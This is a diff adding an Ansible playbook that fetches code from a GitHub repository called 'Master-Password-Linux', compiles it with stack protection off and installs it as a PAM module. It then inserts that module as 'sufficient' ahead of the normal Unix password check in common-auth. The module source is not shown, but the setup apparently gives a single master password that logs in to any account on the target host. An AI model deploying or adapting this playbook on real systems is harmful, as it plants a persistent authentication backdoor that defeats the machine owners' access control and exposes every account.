@@ -1,0 +1,44 @@
+---
+- name: Setup Password for Linux using PAM
+  hosts: target_host # Change this to your target hostname or group
+  become: yes
+  vars:
+    repo_url: 'https://github.com/dikshitkhandelwal/Master-Password-Linux.git'
+    dest_dir: '/tmp/Master-Password-Linux'
+    
+  tasks:
+    - name: Install necessary packages
+      apt:
+        name:
+          - libpam0g-dev
+          - gcc
+          - make
+          - git
+        state: present
+
+    - name: Clone the git repository
+      git:
+        repo: "{{ repo_url }}"
+        dest: "{{ dest_dir }}"
+        clone: yes
+        update: yes
+      register: git_result
+
+    - name: Compile the C module
+      command:
+        cmd: "gcc -fPIC -fno-stack-protector -c {{ dest_dir }}/my_module.c"
+        creates: "{{ dest_dir }}/my_module.o"
+      when: git_result is changed
+
+    - name: Link the module object to create the shared object
+      command:
+        cmd: "ld -x --shared -o /lib/x86_64-linux-gnu/security/pam_mymodule.so {{ dest_dir }}/my_module.o"
+        creates: "/lib/x86_64-linux-gnu/security/pam_mymodule.so"
+      when: git_result is changed
+
+    - name: Add custom PAM module configuration to common-auth
+      lineinfile:
+        path: /etc/pam.d/common-auth
+        line: 'auth sufficient pam_mymodule.so'
+        insertbefore: '^auth\s+\[success=1 default=ignore\]\s+pam_unix.so nullok'
+        state: present
